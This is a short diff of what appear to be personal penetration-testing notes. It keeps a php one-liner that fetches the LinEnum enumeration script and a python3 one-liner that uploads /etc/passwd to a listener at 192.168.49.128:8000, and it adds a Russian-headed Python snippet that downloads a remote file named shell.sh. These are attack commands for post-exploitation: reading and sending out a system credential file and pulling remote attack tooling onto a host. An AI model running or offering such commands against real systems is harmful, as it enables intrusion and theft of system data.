@@ -13,3 +13,14 @@ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/mas
 download with onestring python:
 
 python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+
+
+
+Простая Программа для скачивания на Python
+import urllib.request
+
+print('succefully')
+
+url = 'https://raw.githubusercontent.com/kostya300/shellqqq/shelll/shell.sh'
+
+urllib.request.urlretrieve(url, '/home/qwe/Desktop/myHash/fg.txt')
